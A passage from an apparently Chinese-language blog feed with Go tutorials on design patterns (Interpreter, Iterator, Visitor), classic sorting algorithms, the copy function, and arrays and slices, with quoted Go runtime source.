title="解释器模式（Interpreter）"></a>解释器模式（Interpreter）</h3><p>解释器模式定义一套语言文法，并设计该语言解释器，使用户能使用特定文法控制解释器行为。解释器模式的意义在于，它分离多种复杂功能的实现，每个功能只需关注自身的解释。对于调用者不用关心内部的解释器的工作，只需要用简单的方式组合命令就可以。</p><pre><code>package mainimport (    &quot;fmt&quot;    &quot;strconv&quot;    &quot;strings&quot;)// Expression 是定义了解释方法的接口type Expression interface &#123;    Interpret() int&#125;// Number 是表示数字的终结符表达式type Number struct &#123;    value int&#125;func (n *Number) Interpret() int &#123;    return n.value&#125;// Add 是表示加法的非终结符表达式type Add struct &#123;    left  Expression    right Expression&#125;func (a *Add) Interpret() int &#123;    return a.left.Interpret() + a.right.Interpret()&#125;// Subtract 是表示减法的非终结符表达式type Subtract struct &#123;    left  Expression    right Expression&#125;func (s *Subtract) Interpret() int &#123;    return s.left.Interpret() - s.right.Interpret()&#125;// Parse 是一个简单的解析器，用于解析输入的表达式func Parse(expression string) Expression &#123;    tokens := strings.Split(expression, &quot; &quot;)    stack := []Expression&#123;&#125;    for _, token := range tokens &#123;        switch token &#123;        case &quot;+&quot;:            right := stack[len(stack)-1]            stack = stack[:len(stack)-1]            left := stack[len(stack)-1]            stack = stack[:len(stack)-1]            stack = append(stack, &amp;Add&#123;left: left, right: right&#125;)        case &quot;-&quot;:            right := stack[len(stack)-1]            stack = stack[:len(stack)-1]            left := stack[len(stack)-1]            stack = stack[:len(stack)-1]            stack = append(stack, &amp;Subtract&#123;left: left, right: right&#125;)        default:            value, _ := strconv.Atoi(token)            stack = append(stack, &amp;Number&#123;value: value&#125;)        &#125;    &#125;    return stack[0]&#125;func main() &#123;    expression := &quot;3 4 + 2 -&quot;    parsedExpression := Parse(expression)    result := parsedExpression.Interpret()    fmt.Println(&quot;Result:&quot;, result) // 输出结果: 5&#125;</code></pre><p>解释器模式的优点</p><ul><li>易于扩展：可以很容易地扩展文法规则，只需增加新的解释器类即可。</li><li>灵活性：可以很容易地修改和扩展文法规则，而不需要修改现有的解释器代码。</li><li>易于实现：对于简单的文法规则，解释器模式的实现相对简单。</li></ul><p>解释器模式的缺点</p><ul><li>性能问题：对于复杂的文法规则，解释器模式的性能可能较差，因为每个文法规则都需要一个解释器类。</li><li>复杂性：对于复杂的文法规则，解释器模式的实现可能会变得非常复杂。</li></ul><p>解释器模式的适用场景</p><ul><li>简单的文法规则：适用于简单的文法规则，例如数学表达式求值、简单的脚本语言等。</li><li>重复出现的问题：适用于那些需要重复解决的问题，例如配置文件解析、命令解释等。</li></ul><h3 id="迭代器模式（Iterator）"><a href="#迭代器模式（Iterator）" class="headerlink" title="迭代器模式（Iterator）"></a>迭代器模式（Iterator）</h3><p>提供一种方法顺序访问一个聚合对象中的各个元素，而不需要暴露该对象的内部表示。迭代器模式使用相同方式送代不同类型集合或者隐藏集合类型的具体实现，将遍历聚合对象的责任从聚合对象中分离出来，简化了聚合对象的接口和实现。</p><pre><code>package mainimport &quot;fmt&quot;// Iterator 是定义了遍历方法的接口type Iterator interface &#123;    HasNext() bool    Next() interface&#123;&#125;&#125;// Aggregate 是定义了创建迭代器方法的接口type Aggregate interface &#123;    CreateIterator() Iterator&#125;// ConcreteAggregate 是具体的聚合类type ConcreteAggregate struct &#123;    items []interface&#123;&#125;&#125;func (a *ConcreteAggregate) CreateIterator() Iterator &#123;    return &amp;ConcreteIterator&#123;aggregate: a, currentIndex: 0&#125;&#125;// ConcreteIterator 是具体的迭代器类type ConcreteIterator struct &#123;    aggregate   *ConcreteAggregate    currentIndex int&#125;func (i *ConcreteIterator) HasNext() bool &#123;    return i.currentIndex &lt; len(i.aggregate.items)&#125;func (i *ConcreteIterator) Next() interface&#123;&#125; &#123;    if i.HasNext() &#123;        item := i.aggregate.items[i.currentIndex]        i.currentIndex++        return item    &#125;    return nil&#125;func main() &#123;    aggregate := &amp;ConcreteAggregate&#123;        items: []interface&#123;&#125;&#123;&quot;Item1&quot;, &quot;Item2&quot;, &quot;Item3&quot;&#125;,    &#125;    iterator := aggregate.CreateIterator()    for iterator.HasNext() &#123;        item := iterator.Next()        fmt.Println(item)    &#125;&#125;</code></pre><p>迭代器模式的优点</p><ul><li>简化聚合类：将遍历聚合对象的责任从聚合对象中分离出来，简化了聚合对象的接口和实现。</li><li>一致的遍历接口：提供了一致的遍历接口，使得不同的聚合对象可以使用相同的遍历方式。</li><li>灵活性：可以在不修改聚合对象的情况下，定义新的迭代器来遍历聚合对象。</li></ul><p>迭代器模式的缺点</p><ul><li>增加类的数量：引入迭代器模式会增加类的数量，因为需要额外的迭代器类。</li><li>性能开销：迭代器模式可能会增加系统的性能开销，特别是在遍历大型聚合对象时。</li></ul><p>迭代器模式的适用场景</p><ul><li>遍历聚合对象：需要遍历一个聚合对象中的各个元素，而不需要暴露该对象的内部表示。</li><li>不同的遍历方式：需要以不同的方式遍历一个聚合对象中的各个元素。</li></ul><h3 id="访问者模式（Visitor）"><a href="#访问者模式（Visitor）" class="headerlink" title="访问者模式（Visitor）"></a>访问者模式（Visitor）</h3><p>允许在不修改对象结构的情况下，增加新的操作。访问者模式将操作分离到独立的对象中，使得新的操作可以很容易地添加到对象结构中。对象只要预留访问者接口Accept则后期为对象添加功能的时候就不需要改动对象。</p><pre><code>package mainimport &quot;fmt&quot;// Element 是定义了接受访问者的方法的接口type Element interface &#123;    Accept(visitor Visitor)&#125;// File 是具体的文件类type File struct &#123;    name string    size int&#125;func (f *File) Accept(visitor Visitor) &#123;    visitor.VisitFile(f)&#125;// Directory 是具体的目录类type Directory struct &#123;    name     string    contents []Element&#125;func (d *Directory) Accept(visitor Visitor) &#123;    visitor.VisitDirectory(d)&#125;// Visitor 是定义了访问方法的接口type Visitor interface &#123;    VisitFile(file *File)    VisitDirectory(directory *Directory)&#125;// SizeVisitor 是具体的访问者类，用于计算总大小type SizeVisitor struct &#123;    totalSize int&#125;func (v *SizeVisitor) VisitFile(file *File) &#123;    v.totalSize += file.size&#125;func (v *SizeVisitor) VisitDirectory(directory *Directory) &#123;    for _, element := range directory.contents &#123;        element.Accept(v)    &#125;&#125;func (v *SizeVisitor) TotalSize() int &#123;    return v.totalSize&#125;// NameVisitor 是具体的访问者类，用于列出所有文件的名称type NameVisitor struct &#123;    names []string&#125;func (v *NameVisitor) VisitFile(file *File) &#123;    v.names = append(v.names, file.name)&#125;func (v *NameVisitor) VisitDirectory(directory *Directory) &#123;    for _, element := range directory.contents &#123;        element.Accept(v)    &#125;&#125;func (v *NameVisitor) Names() []string &#123;    return v.names&#125;func main() &#123;    // 创建文件和目录    file1 := &amp;File&#123;name: &quot;file1.txt&quot;, size: 100&#125;    file2 := &amp;File&#123;name: &quot;file2.txt&quot;, size: 200&#125;    dir := &amp;Directory&#123;name: &quot;dir&quot;, contents: []Element&#123;file1, file2&#125;&#125;    // 使用 SizeVisitor 计算总大小    sizeVisitor := &amp;SizeVisitor&#123;&#125;    dir.Accept(sizeVisitor)    fmt.Println(&quot;Total size:&quot;, sizeVisitor.TotalSize())    // 使用 NameVisitor 列出所有文件的名称    nameVisitor := &amp;NameVisitor&#123;&#125;    dir.Accept(nameVisitor)    fmt.Println(&quot;File names:&quot;, nameVisitor.Names())&#125;</code></pre><p>访问者模式的优点</p><ul><li>增加新的操作：可以在不修改对象结构的情况下增加新的操作。</li><li>分离关注点：将操作与对象结构分离，使得代码更清晰、更易维护。</li><li>扩展性好：可以很容易地增加新的访问者来实现新的操作。</li></ul><p>访问者模式的缺点</p><ul><li>违反单一职责原则：访问者模式将不同的操作集中到访问者中，可能会导致访问者类职责过重。</li><li>对象结构的变化：如果对象结构发生变化，需要修改所有的访问者类。</li><li>双重分派：访问者模式需要双重分派（double dispatch），这在某些编程语言中可能不太直观。</li></ul><p>访问者模式的适用场景</p><ul><li>对象结构稳定：对象结构相对稳定，但需要在对象结构上定义新的操作。</li><li>需要对对象结构中的元素进行多种不同且不相关的操作：可以使用访问者模式将这些操作分离到独立的访问者中。</li></ul><p>参考资料</p><p><a href="https://www.yuque.com/aceld/lfhu8y">Easy搞定Golang设计模式</a><br><a href="https://blog.csdn.net/qq_36256590/article/details/114707991">单例模式及为何构造函数私有化</a></p>]]></content>
      
      
      <categories>
          
          <category> technique </category>
          
      </categories>
      
      
        <tags>
            
            <tag> design pattern </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>经典内部排序算法 | Go实现</title>
      <link href="/technique/42.html"/>
      <url>/technique/42.html</url>
      
        <content type="html"><![CDATA[<p>内部排序的所有排序操作都在内存中完成，不需要额外的磁盘或其他存储设备的辅助。这适用于数据量小到足以完全加载到内存中的情况。常见的内部排序算法有：插入排序、希尔排序、选择排序、冒泡排序、归并排序、快速排序、堆排序等。外部排序通常涉及到数据的分区处理，部分数据被暂时存储在外部磁盘等存储设备上。常见的外部排序算法有计数排序、基数排序、桶排序。</p><h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h3><ul><li><p>描述：对于要排序的数组，从第一位开始从前往后比较相邻两个数字，若前者大，则交换两数字位置，然后比较位向右移动一位。记录前一轮交换的最终位置，该位置之后的元素为已排序状态，下一轮的交换只需执行到该处，每一轮的比较将使得当前未排序数字中的最大者被排序，未排序数字总数减 1。第 $arr.length - 1$ 轮结束后排序完成。</p></li><li><p>稳定性：稳定</p></li><li><p>优化：当某一轮比较均未发生交换，说明排序已完成，可设置一个布尔值记录一轮排序是否有发生交换，若无则提前退出循环结束程序。</p></li><li><p>时间复杂度分析：有序数组为O($n$)，无序数组为O($n^2$)</p></li><li><p>空间复杂度：O(1)</p></li><li><p>代码：</p><pre><code>func bubbleSort(arr []int) &#123;  n := len(arr)  for i := 0; i &lt; n-1; i++ &#123;      swapped := false      for j := 0; j &lt; n-i-1; j++ &#123;          if arr[j] &gt; arr[j+1] &#123;              arr[j], arr[j+1] = arr[j+1], arr[j]              swapped = true          &#125;      &#125;      // 如果一轮遍历没有发生交换，说明数组已经有序，可以提前退出      if !swapped &#123;          break      &#125;  &#125;&#125;</code></pre></li></ul><h3 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h3><ul><li><p>描述：对于要排序的数组，设置一个 $minIdx$ 记录最小数字下标。先假设第 1 个数字最小，此时 minIdx &#x3D; 0 ，将 $arr[minIdx]$ 与后续数字逐一比较，当遇到更小的数字时，使 $minIdx$ 等于该数字下标，第1轮比较将找出此时数组中最小的数字。找到后将 $minIdx$ 下标的数字与第 1 个数字交换，此时称一个数字已被排序。然后开始第2轮比较，令 minIdx &#x3D; 1，重复上述过程。每一轮的比较将使得当前未排序数字中的最小者被排序，未排序数字总数减 1。第 $arr.length - 1$ 轮结束后排序完成。</p></li><li><p>稳定性：不稳定。存在跨越交换。找到本轮次最小值之后，将其与本轮起始数字交换，此时若中间有与起始元素同值的元素，将打破稳定性。例:　7 7 2 。第一轮交换第一个 7 和 2，则两个 7 位置关系改变。</p></li><li><p>时间复杂度分析：O($n^2$)（选择排序的交换次数是 $O(n)$，而冒泡排序的平均交换次数是O($n^2$)）</p></li><li><p>空间复杂度：O(1)</p></li><li><p>代码：</p></li></ul><pre><code>//单元选择func selectSort(nums []int)&#123;    minIndex := 0    for i := 0; i &lt; len(nums) - 1; i++&#123;        //查找最小值        for j := i+1; j &lt; len(nums); j++&#123;            if nums[minIndex] &gt; nums[j]&#123;                minIndex = j            &#125;        &#125;        //更新最小值        if nums[i] != nums[minIndex]&#123;            nums[i], nums[minIndex] = nums[minIndex], nums[i]        &#125;                minIndex = i + 1    &#125;&#125;</code></pre><pre><code>//双元选择 在遍历寻找最小值下标时，可以同时寻找最大值下标func biSelectSort(nums []int) &#123;    minIndex := 0    for i := 0; i &lt; len(nums)- i- 1; i++ &#123;        maxIndex := len(nums) - i - 1        if nums[maxIndex] &lt; nums[minIndex] &#123;            nums[minIndex], nums[maxIndex] = nums[maxIndex], nums[minIndex]        &#125;        //查找最大值，最小值        for j := i + 1; j &lt; len(nums)-i-1; j++ &#123;            if nums[minIndex] &gt; nums[j] &#123;                minIndex = j            &#125;            if nums[maxIndex] &lt; nums[j] &#123;                maxIndex = j            &#125;        &#125;        //更新最大值，最小值        if nums[i] != nums[minIndex] &#123;            nums[i], nums[minIndex] = nums[minIndex], nums[i]        &#125;        if nums[maxIndex] != nums[len(nums)-i-1] &#123;            nums[maxIndex], nums[len(nums)-i-1] = nums[len(nums)-i-1], nums[maxIndex]        &#125;        minIndex = i + 1    &#125;&#125;</code></pre><h3 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h3><ul><li><p>描述：对于待排序数组，从第 2 个元素开始 (称作插入对象元素) ，比较它与之前的元素 (称作比较对象元素) ，当插入对象元素小于比较对象元素时，继续往前比较，直到不小于 (≥) 比较对象，此时将插入对象元素插入到该次比较对象元素之后。重复这个插入过程直到最后一个元素作为插入对象元素完成插入操作。</p></li><li><p>稳定性：简单插入和二分插入是稳定的</p></li><li><p>时间复杂度：O($n^2$)</p></li><li><p>空间复杂度：O(1)</p></li><li><p>代码：</p><pre><code>简单插入func insertSort(nums []int) &#123;  for i := 1; i &lt; len(nums); i++ &#123;      insertIndex := i      for j := i - 1; j &gt;= 0; j-- &#123;          //如果元素更小          if nums[insertIndex] &lt; nums[j] &#123;              nums[insertIndex], nums[j] = nums[j], nums[insertIndex]              insertIndex = j          &#125;else&#123;              break // 如果元素不小于前一个元素，不再需要插入          &#125;      &#125;  &#125;&#125;</code></pre></li></ul><pre><code>// 二分插入//每一轮向前插入都使得该元素在完成插入后，从第一个元素到该元素是排序状态（指这部分的相对排序状态，在它们中间后续可能还会插入其他数字），利用这一点，对一个新的插入对象向前执行折半插入，能够显著减少比较的次数。func binInsertSort(nums[]int)&#123;    for i := 1 ; i &lt; len(nums); i++&#123;        insertIndex := i        left := 0        right := i - 1        for left &lt;= right&#123;            mid := left + (right - left)/2             if nums[insertIndex] &lt; nums[mid]&#123;                right = mid - 1            &#125;else if nums[insertIndex] &gt; nums[mid]&#123;                left = mid + 1            &#125;else&#123;                left = mid            &#125;        &#125;        temp := nums[insertIndex]        for j := insertIndex ; j &gt; left; j--&#123;             nums[j] = nums[j -1]         &#125;        nums[left] = temp            &#125;&#125;</code></pre><h3 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h3><ul><li><p>描述：是简单插入排序经过改进之后的一个更高效的版本，也称为递减增量排序算法。先将整个待排序的记录序列分割成为若干子序列分别进行直接插入排序，待整个序列中的记录 “基本有序” 时，再对全体记录进行依次直接插入排序。对原待排序列中相隔 $gap$ 的数字执行简单插入排序，然后缩小 $gap$，对新的 $gap$ 间隔的数字再次执行简单插入排序。希尔提出的增量序列生成式为 $n &#x2F; 2^k$，k &#x3D; 1, 2, 3, … ，例如 n &#x3D; 11，则增量序列为 ${1,2,5}$ 。在讨论希尔排序时，可将其称为 Shell增量，另有更优的 Hibbard增量、Knuth增量、Sedgewick增量 等。</p></li><li><p>稳定性：不稳定</p></li><li><p>时间复杂度：最差O($n^2$) 最好O($nlogn$)</p></li><li><p>空间复杂度：O(1)</p></li><li><p>代码：<br>&#96;&#96;&#96;<br>&#x2F;&#x2F;shell增量<br>func shellSort(arr []int)[]int{<br>  n :&#x3D; len(arr)<br>  gap :&#x3D; n &#x2F; 2<br>  for gap &gt; 0{<br>  for i :&#x3D; gap; i &lt; n; i++{<br>      current :&#x3D; arr[i]<br>      preIndex :&#x3D; i - gap<br>      &#x2F;&#x2F;插入排序<br>      for(preIndex &gt;&#x3D; 0 &amp;&amp; arr[preIndex] &gt; current){<br>          arr[preIndex + gap] &#x3D; arr[preIndex]<br>          preIndex -&#x3D; gap<br>      }<br>      arr[preIndex + gap] &#x3D; current<br>  }<br>  gap &#x2F;&#x3D; 2<br>  }<br>  return arr<br>}</p></li></ul><pre><code>### 归并排序- 描述：归并排序是 分治思想 的应用，即将原待排数组 递归或迭代 地分为左右两半，直到数组长度为 1，然后合并 (merge) 左右数组，在合并中完成排序。- 稳定性：稳定- 时间复杂度：O($nlogn$)- 空间复杂度：O(n)- 代码：可以通过 自顶向下 (top-down) 或 自底向上 (bottom-up) 的方式实现归并排序。</code></pre><p>&#x2F;&#x2F;自顶向下 (top-down)：从输入数组出发，不断二分该数组，直到数组长度为1，再执行合并。适合用 递归 实现。<br>&#x2F;&#x2F;归<br>func mergeSort(arr []int) []int {<br>    if len(arr) &lt; 2 {<br>        return arr<br>    }<br>    mid :&#x3D; len(arr) &#x2F; 2<br>    left :&#x3D; mergeSort(arr[:mid])<br>    right :&#x3D; mergeSort(arr[mid:])<br>    result :&#x3D; merge(left, right)<br>    return result<br>}</p><p>&#x2F;&#x2F;并<br>func merge(left, right []int) []int {<br>    temp :&#x3D; make([]int, 0)<br>    i, j :&#x3D; 0, 0<br>    for i &lt; len(left) &amp;&amp; j &lt; len(right) {<br>        if left[i] &lt;&#x3D; right[j] {<br>            temp &#x3D; append(temp, left[i])<br>            i++<br>        } else {<br>            temp &#x3D; append(temp, right[j])<br>            j++<br>        }<br>    }<br>    if i &lt; len(left) {<br>        temp &#x3D; append(temp, left[i:]…)<br>    }<br>    if j &lt; len(right) {<br>        temp &#x3D; append(temp, right[j:]…)<br>    }<br>    return temp</p><p>}</p><p>&#96;&#96;&#96;<br>参考资料：</p><p><a href="https://iyukiyama.github.io/sorting/">十大排序从入门到入赘</a></p>]]></content>
      
      
      <categories>
          
          <category> technique </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sort </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>copy函数 | Go</title>
      <link href="/technique/41.html"/>
      <url>/technique/41.html</url>
      
        <content type="html"><![CDATA[<p>copy函数格式如下，仅接受切片类型的参数。其中 srcSlice 为数据来源切片，destSlice 为复制的目标（也就是将 srcSlice 复制到 destSlice），<strong>来源和目标的类型必须一致</strong>，copy() 函数的返回值表示实际发生复制的元素个数。</p><pre><code>copy( destSlice, srcSlice []T) int</code></pre><p>那么数组能拷贝到切片吗？ 由于copy来源和目标的类型必须一致，因此需要使用<code>[:]</code>操作将数组转为切片。</p><pre><code>array4 := [4]int&#123;4, -4, 4, -4&#125;s6 := []int&#123;1, -1, 1, -1, -5, 5&#125;copy(s6, array4[0:])fmt.Println(&quot;s6:&quot;, s6) //s6: [4 -4 4 -4 -5 5]</code></pre><p>查看copy的源码，copy()会先计算 dst 的长度 l&#x3D;len(dst)，再计算**复制长度 n&#x3D;min(len(src), l)**。拷贝为为深拷贝，将src切片指向底层数组中的值拷贝到dst切片指向的数组中，针对dst切片进行的操作不会对src产生任何的影响。</p><pre><code>// runtime/slice.go// slicecopy is used to copy from a string or slice of pointerless elements into a slice.func slicecopy(toPtr unsafe.Pointer, toLen int, fromPtr unsafe.Pointer, fromLen int, width uintptr) int &#123;    if fromLen == 0 || toLen == 0 &#123;        return 0    &#125;    n := fromLen    if toLen &lt; n &#123;        n = toLen    &#125;    if width == 0 &#123;        return n    &#125;    size := uintptr(n) * width    if raceenabled &#123;        callerpc := getcallerpc()        pc := abi.FuncPCABIInternal(slicecopy)        racereadrangepc(fromPtr, size, callerpc, pc)        racewriterangepc(toPtr, size, callerpc, pc)    &#125;    if msanenabled &#123;        msanread(fromPtr, size)        msanwrite(toPtr, size)    &#125;    if asanenabled &#123;        asanread(fromPtr, size)        asanwrite(toPtr, size)    &#125;    if size == 1 &#123; // common case worth about 2x to do here        // TODO: is this still worth it with new memmove impl?        *(*byte)(toPtr) = *(*byte)(fromPtr) // known to be a byte pointer    &#125; else &#123;        memmove(toPtr, fromPtr, size)    &#125;    return n&#125;</code></pre><p>copy使用：这里将 s1 切片中的 3 个元素复制到 s2 中,n 返回复制的元素个数 3。s4 的长度只有 2,所以只复制了 s3 的前 2 个元素,n 返回 2。slice1的长度为0，因此复制长度为0，输出[]。</p><pre><code>s1 := []int&#123;1, 2, 3&#125;s2 := make([]int, 10) n := copy(s2, s1)fmt.Println(s1, s2, n) // [1 2 3] [1 2 3 0 0 0 0 0 0 0] 3s3 := []int&#123;1, 2, 3&#125;s4 := make([]int, 2)n = copy(s4, s3) fmt.Println(s3, s4, n) // [1 2 3] [1 2] 2slice1 := make([]int,0,3)slice2 := []int&#123;6, 7, 8, 9&#125;copy(slice1, slice2)fmt.Println(slice1)  //[]</code></pre><p>再查看如下代码：</p><pre><code>package mainimport &quot;fmt&quot;func main() &#123;    src := []int&#123;1, 2, 3, 4, 5&#125;    dst := make([]int, 5)    numberOfElementsCopied := copy(dst, src)    fmt.Printf(&quot;Number Of Elements Copied: %d\n&quot;, numberOfElementsCopied)    fmt.Printf(&quot;dst: %v\n&quot;, dst)    fmt.Printf(&quot;src: %v\n&quot;, src)    //After changing dst    dst[0] = 10    fmt.Println(&quot;\nAfter changing dst&quot;)    fmt.Printf(&quot;dst: %v\n&quot;, dst)    fmt.Printf(&quot;src: %v\n&quot;, src)    //Length of destination is less than length of source    dst = make([]int, 4)    numberOfElementsCopied = copy(dst, src)    fmt.Println(&quot;\nLength of dst less than src&quot;)    fmt.Printf(&quot;Number Of Elements Copied: %d\n&quot;, numberOfElementsCopied)    fmt.Printf(&quot;dst: %v\n&quot;, dst)    fmt.Printf(&quot;src: %v\n&quot;, src)    //Length of destination is greater than length of source    dst = make([]int, 6)    numberOfElementsCopied = copy(dst, src)    fmt.Println(&quot;\nLength of dst less than src&quot;)    fmt.Printf(&quot;Number Of Elements Copied: %d\n&quot;, numberOfElementsCopied)    fmt.Printf(&quot;dst: %v\n&quot;, dst)    fmt.Printf(&quot;src: %v\n&quot;, src)&#125;</code></pre><p>输出为：</p><pre><code>Number Of Elements Copied: 5dst: [1 2 3 4 5]src: [1 2 3 4 5]After changing dstdst: [10 2 3 4 5]src: [1 2 3 4 5]Length of dst less than srcNumber Of Elements Copied: 4dst: [1 2 3 4]src: [1 2 3 4 5]Length of dst less than srcNumber Of Elements Copied: 5dst: [1 2 3 4 5 0]src: [1 2 3 4 5]</code></pre><p>参考资料：</p><p><a href="https://golangbyexample.com/copy-function-in-golang/">Copy function in Go (Golang)</a><br><a href="https://liangtian.me/post/go-slice/">golang Slice的创建、添加、删除等操作和源码分析</a></p>]]></content>
      
      
      <categories>
          
          <category> technique </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数组与切片 | Go</title>
      <link href="/technique/40.html"/>
      <url>/technique/40.html</url>
      
        <content type="html"><![CDATA[<h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>数组是具有<strong>相同唯一类型</strong>的一组<strong>长度固定</strong>的数据项序列。类型可以是任意的原始类型例如整型、字符串或者自定义类型。数组元素可以通过 索引（位置）来读取（或者修改），索引从 0 开始。数组长度必须是一个常量表达式（且为非负整数），数组长度也是数组类型的一部分，数组的类型为[len]Type，所以 [5] int 和 [10] int 是属于不同类型的。</p><p>数组声明的格式如下，声明数组时所有的元素都会被自动初始化为类型的零值：</p><pre><code>var identifier [len]type//var arr [5]int</code></pre><p>如果数组值已经提前知道了，那么可以通过 数组常量 的方法来初始化数组：</p><pre><code>var arr1 = [5]int&#123;18, 20, 15, 22, 16&#125;//arr2时有 10 个元素的数组，除了前三个元素外其他元素都为 0。var arr2 = [10]int &#123;1, 2, 3&#125; var arr3 = [...]int&#123;5, 6, 7, 8, 22&#125;//只有索引 3 和 4 被赋予实际的值，其他元素都被设置为空的字符串var arr4 = [5]string&#123;3: &quot;Chris&quot;, 4: &quot;Ron&quot;&#125;</code></pre><h3 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h3><p>切片（slice）是对数组一个连续片段的引用（数组实际上是切片的构建块），其长度是可变的。slice由三部分组成：长度、容量、指针。指针指向底层数组，长度为当前容纳的数据长度，容量为能容纳数据的最大长度。slice的类型为[]Type。</p><blockquote><p>A slice is a data structure describing a contiguous section of an array stored separately from the slice variable itself. A slice is not an array. A slice describes a piece of an array</p></blockquote><pre><code>// runtime/slice.gotype slice struct &#123;    array unsafe.Pointer // 元素指针    len   int // 长度     cap   int // 容量&#125;</code></pre><p>切片的声明格式如下，不说明长度。一个切片在未初始化之前默认为 nil，长度为 0。</p><pre><code>var identifier []type//var a []int//fmt.Println(a)//fmt.Println(a==nil)//[]//true</code></pre><p>切片也可以用类似数组的方式初始化：</p><pre><code>var x = []int&#123;2, 3, 5, 7, 11&#125;</code></pre><p>创建slice的方式有以下几种：</p><ul><li>对数组&#x2F;切片进行截取（左闭右开）<pre><code>var data [10]intslice := data[2:8]  //仅指定索引和长度slice = slice[1:3]slice1 := data[1:2:3] //指定长度为2-1 = 1，容量为3-1 = 2</code></pre></li></ul><p>查看如下代码，一开始slice1是数组arr1从2到4索引对应的元素，此时数组长度为6。对于slice1来说，容量为6-2 &#x3D; 4。因此<code>slice1 = slice1[0:4]</code>可以正常运行，因此仍然在容量内：</p><pre><code>package mainimport &quot;fmt&quot;func main() &#123;    var arr1 [6]int    var slice1 []int = arr1[2:5] // item at index 5 not included!    // load the array with integers: 0,1,2,3,4,5    for i := 0; i &lt; len(arr1); i++ &#123;        arr1[i] = i    &#125;    // print the slice    for i := 0; i &lt; len(slice1); i++ &#123;        fmt.Printf(&quot;Slice at %d is %d\n&quot;, i, slice1[i])    &#125;    fmt.Printf(&quot;The length of arr1 is %d\n&quot;, len(arr1))    fmt.Printf(&quot;The length of slice1 is %d\n&quot;, len(slice1))    fmt.Printf(&quot;The capacity of slice1 is %d\n&quot;, cap(slice1))    // grow the slice    slice1 = slice1[0:4]    for i := 0; i &lt; len(slice1); i++ &#123;        fmt.Printf(&quot;Slice at %d is %d\n&quot;, i, slice1[i])    &#125;    fmt.Printf(&quot;The length of slice1 is %d\n&quot;, len(slice1))    fmt.Printf(&quot;The capacity of slice1 is %d\n&quot;, cap(slice1))    // grow the slice beyond capacity    //slice1 = slice1[0:7] // panic: runtime error: slice bound out of range&#125;</code></pre><p>输出为：</p><pre><code>Slice at 0 is 2  Slice at 1 is 3  Slice at 2 is 4  The length of arr1 is 6  The length of slice1 is 3  The capacity of slice1 is 4  Slice at 0 is 2  Slice at 1 is 3  Slice at 2 is 4  Slice at 3 is 5  The length of slice1 is 4  The capacity of slice1 is 4  </code></pre><ul><li>通过make创建，可以指定len、cap<pre><code>slice := make([]int,5,10)</code></pre>使用make创建切片，make 的使用方式是：<code>func make([]T, len, cap)</code>，其中 cap 是可选参数。</li></ul><p><code>var slice1 []type = make([]type, len)</code>，也可以简写为<code>slice1 := make([]type, len)</code>。这里 len 是底层数组的长度并且也是 slice 的初始长度，容量大小也为len。【也要注意使用make时设置的长度和容量】</p><p>makeslice分配的内存大小为类型et的size * cap，创建时会判断是否超过允许的分配的最大内存。</p><pre><code>// runtime/malloc.gofunc makeslice(et *_type, len, cap int) unsafe.Pointer &#123;    mem, overflow := math.MulUintptr(et.size, uintptr(cap))    if overflow || mem &gt; maxAlloc || len &lt; 0 || len &gt; cap &#123;        // NOTE: Produce a &#39;len out of range&#39; error instead of a        // &#39;cap out of range&#39; error when someone does make([]T, bignumber).        // &#39;cap out of range&#39; is true too, but since the cap is only being        // supplied implicitly, saying len is clearer.        // See golang.org/issue/4085.        mem, overflow := math.MulUintptr(et.size, uintptr(len))        if overflow || mem &gt; maxAlloc || len &lt; 0 &#123;            panicmakeslicelen()        &#125;        panicmakeslicecap()    &#125;    return mallocgc(mem, et, true)&#125;</code></pre><p>newarray分配的内存大小为size * len，与makeslice比，主要少了cap相关的检查：</p><pre><code>// newarray allocates an array of n elements of type typ.func newarray(typ *_type, n int) unsafe.Pointer &#123;    if n == 1 &#123;        return mallocgc(typ.size, typ, true)    &#125;    mem, overflow := math.MulUintptr(typ.size, uintptr(n))    if overflow || mem &gt; maxAlloc || n &lt; 0 &#123;        panic(plainError(&quot;runtime: allocation size out of range&quot;))    &#125;    return mallocgc(mem, typ, true)&#125;</code></pre><p>再看如下代码，sliceHeader是slice在运行时的表示，sliceHeader在构造时，先通过unsafe_NewArray创建Data。而unsafe_NewArray就是调用的newarray，因此MakeSlice就是创建一个持有cap大小的数组的sliceHeader。</p><pre><code>// reflect/value.go// SliceHeader is the runtime representation of a slice.// It cannot be used safely or portably and its representation may// change in a later release.// Moreover, the Data field is not sufficient to guarantee the data// it references will not be garbage collected, so programs must keep// a separate, correctly typed pointer to the underlying data.type SliceHeader struct &#123;    Data uintptr    Len  int    Cap  int&#125;// sliceHeader is a safe version of SliceHeader used within this package.type sliceHeader struct &#123;    Data unsafe.Pointer    Len  int    Cap  int&#125;// MakeSlice creates a new zero-initialized slice value// for the specified slice type, length, and capacity.func MakeSlice(typ Type, len, cap int) Value &#123;    if typ.Kind() != Slice &#123;        panic(&quot;reflect.MakeSlice of non-slice type&quot;)    &#125;    if len &lt; 0 &#123;        panic(&quot;reflect.MakeSlice: negative len&quot;)    &#125;    if cap &lt; 0 &#123;        panic(&quot;reflect.MakeSlice: negative cap&quot;)    &#125;    if len &gt; cap &#123;        panic(&quot;reflect.MakeSlice: len &gt; cap&quot;)    &#125;    s := unsafeheader.Slice&#123;Data: unsafe_NewArray(typ.Elem().(*rtype), cap), Len: len, Cap: cap&#125;    return Value&#123;typ.(*rtype), unsafe.Pointer(&amp;s), flagIndir | flag(Slice)&#125;&#125;</code></pre><ul><li>对slice进行append生成</li></ul><pre><code>slice := make([]int,5,10)slice = append(slice,6)</code></pre><p>append func说明如下，append会追加一个或多个数据至slice中，这些数据会存储在slice的持有的数组中，最后返回一个新的slice，因此必须保存append的结果：</p><pre><code>// builtin/builtin.go// The append built-in function appends elements to the end of a slice. If// it has sufficient capacity, the destination is resliced to accommodate the// new elements. If it does not, a new underlying array will be allocated.// Append returns the updated 